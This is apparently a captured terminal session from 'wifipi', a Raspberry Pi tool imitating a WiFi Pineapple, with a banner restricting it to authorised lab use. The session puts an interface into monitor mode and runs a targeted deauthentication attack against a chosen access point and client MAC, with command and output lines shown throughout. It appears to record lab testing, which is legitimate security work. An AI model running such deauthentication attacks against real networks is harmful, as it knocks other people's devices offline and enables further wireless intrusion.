@@ -1,0 +1,79 @@
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali-raspberrypi)-[~/Documents/Wifi-location-detection]
+└─$ sudo ./wifipi.sh                                                   
+                                .~~.   .~~.
+                               '. \ ' ' / .'
+ ██╗    ██╗██╗███████╗██╗       .~ .~~~..~.
+ ██║    ██║██║██╔════╝██║      : .~.'~'.~. :
+ ██║ █╗ ██║██║█████╗  ██║     ~ (   ) (   ) ~
+ ██║███╗██║██║██╔══╝  ██║    ( : '~'.~.'~' : )
+ ╚███╔███╔╝██║██║     ██║     ~ .~ (   ) ~.
+  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ~  (  : '~' :  )
+                                '~ .~~~. ~'
+                                     '~'
+                                 Raspberry Pi
+
+ ╔════════════════════════════════════════════════════════════════╗
+ ║ wifipi — WiFi Pineapple Equivalent on Raspberry Pi             ║
+ ║ Authorised lab use only. Targets must be YOUR devices          ║
+ ║ (see lab-notes/inventory.md). Dutch / EU law applies.           ║
+ ╚════════════════════════════════════════════════════════════════╝
+
+Press Enter to acknowledge and continue... 
+[!] missing system tools: hostapd
+    install with: sudo apt install -y aircrack-ng hostapd dnsmasq iptables tcpdump iw
+    modules that need these tools will refuse to load until installed.
+[*] loaded 11 modules; inventory: 0 BSSIDs, 0 clients
+[*] tip: prefix any shell command with `!` (e.g. `!ls loot/`, `!cat loot/…/run.log`)
+
+wifipi > ifaces
+NAME         MODE       PHY      ROLE
+wlan2        managed    phy#0    -
+wlan1        managed    phy#2    -
+wlan0        managed    phy#1    -
+wifipi > iface auto
+
+Killing these processes:
+
+    PID Name
+    523 dhcpcd
+    524 dhcpcd
+    525 dhcpcd
+    526 dhcpcd
+    783 wpa_supplicant
+
+
+
+PHY     Interface       Driver          Chipset
+
+phy1    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+phy2    wlan1           brcmfmac        Broadcom 43430
+phy0    wlan2           rtl8xxxu        TP-Link TL-WN823N v2/v3 [Realtek RTL8192EU]
+                (monitor mode enabled)
+
+[*] MON_IFACE -> wlan2 (monitor mode in place)
+[*] AP_IFACE -> wlan1
+wifipi > use attack/deauth-targeted 
+[*] using attack/deauth-targeted
+wifipi (deauth-targeted) > setg BSSID CC:32:E5:84:9B:CB
+wifipi (deauth-targeted) > setg CLIENT 8E:01:BC:67:67:BE
+wifipi (deauth-targeted) > setg CHANNEL 11
+wifipi (deauth-targeted) > run
+[!] attack/deauth-targeted
+    BSSID=CC:32:E5:84:9B:CB
+    CLIENT=8E:01:BC:67:67:BE
+    CHANNEL=11
+    Confirm targets are in lab-notes/inventory.md. Firing in 3s...
+09:15:34  Waiting for beacon frame (BSSID: CC:32:E5:84:9B:CB) on channel 11
+09:15:35  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [ 2|15 ACKs]
+09:15:36  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [17|40 ACKs]
+09:15:36  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [19|29 ACKs]
+09:15:37  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [84|79 ACKs]
+09:15:37  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [78|71 ACKs]
+09:15:38  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [72|69 ACKs]
+09:15:38  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [22|38 ACKs]
+09:15:39  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [ 3|26 ACKs]
+09:15:39  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [ 0|23 ACKs]
+09:15:40  Sending 64 directed DeAuth (code 7). STMAC: [8E:01:BC:67:67:BE] [ 2|43 ACKs]
+[+] attack/deauth-targeted finished  ->  /home/kali/Documents/Wifi-location-detection/loot/attacks/2026-04-21_09-15-34-attack-deauth-targeted
+wifipi (deauth-targeted) > 
